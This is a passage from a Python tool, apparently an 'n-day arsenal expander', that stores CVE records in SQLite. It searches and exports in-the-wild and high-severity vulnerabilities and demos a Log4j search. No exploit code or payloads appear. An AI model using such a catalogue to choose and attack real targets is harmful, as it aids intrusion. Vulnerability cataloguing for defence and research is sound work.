            "top_vendors": [dict(row) for row in top_vendors],
            "top_products": [dict(row) for row in top_products],
            "top_cwes": [dict(row) for row in top_cwes],
        }

    def get_exploit(self, cve_id: str) -> Optional[Dict]:
        """获取单个CVE的利用方法"""
        row = self.conn.execute("SELECT * FROM cve_records WHERE cve_id = ?", (cve_id,)).fetchone()
        if not row:
            return None

        result = dict(row)
        result['references'] = json.loads(result.get('references', '[]'))
        result['tags'] = json.loads(result.get('tags', '[]'))
        result['in_the_wild'] = bool(result.get('in_the_wild', 0))
        result['has_exploit'] = bool(result.get('has_exploit', 0))
        return result

    def get_in_the_wild_exploits(self, limit: int = 50) -> List[Dict]:
        """获取所有在野利用漏洞"""
        results, _ = self.search(in_the_wild=True, limit=limit)
        return results

    def get_high_risk_exploits(self, cvss_min: float = 9.0, limit: int = 50) -> List[Dict]:
        """获取高危漏洞"""
        results, _ = self.search(cvss_min=cvss_min, limit=limit)
        return results

    def export_to_json(self, filepath: str, keyword: str = "", severity: str = None):
        """导出为JSON"""
        results, total = self.search(keyword=keyword, severity=severity, limit=10000)

        export_data = {
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "total": total,
            "cves": results,
        }

        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(export_data, f, ensure_ascii=False, indent=2)

        logger.info(f"导出完成: {filepath}，共 {total} 条记录")

    def close(self):
        """关闭数据库连接"""
        self.conn.close()


def main():
    """主函数 - 演示用法"""
    print("=" * 60)
    print("  Nday武器库扩充器")
    print("=" * 60)
    print()

    expander = NdayExpander()

    # 1. 从NVD导入（需要网络）
    print("[1/4] 从NVD导入高危CVE...")
    print("  提示: 设置NVD_API_KEY环境变量可提高请求速率")
    print("  导入中... (这可能需要几分钟)")

    # 实际使用时取消注释
    # imported = expander.import_from_nvd(
    #     keywords=["apache", "nginx", "mysql", "php", "java", "spring", "tomcat"],
    #     cvss_min=7.0,
    #     limit=1000,
    #     start_date="2020-01-01"
    # )
    # print(f"  导入完成: {imported} 条")

    print("  [跳过] 如需导入请取消注释代码")
    print()

    # 2. 查看统计
    print("[2/4] 武器库统计...")
    stats = expander.get_statistics()
    print(f"  总计: {stats['total']} 条")
    print(f"  严重: {stats['by_severity'].get('critical', 0)}")
    print(f"  高危: {stats['by_severity'].get('high', 0)}")
    print(f"  在野利用: {stats['in_the_wild']}")
    print(f"  有EXP: {stats['has_exploit']}")
    print()

    # 3. 搜索示例
    print("[3/4] 搜索示例...")
    results, total = expander.search(keyword="Log4j", limit=5)
    print(f"  搜索'Log4j': 找到 {total} 条")
    for r in results[:3]:
        print(f"    - {r['cve_id']}: {r['description'][:80]}...")
    print()

    # 4. 导出
    print("[4/4] 导出示例...")
    # expander.export_to_json("./nday_export.json", severity="critical")
    print("  [跳过] 如需导出请取消注释代码")
    print()

    expander.close()

    print("=" * 60)
    print("  完成！")
    print("=" * 60)


if __name__ == "__main__":
    main()
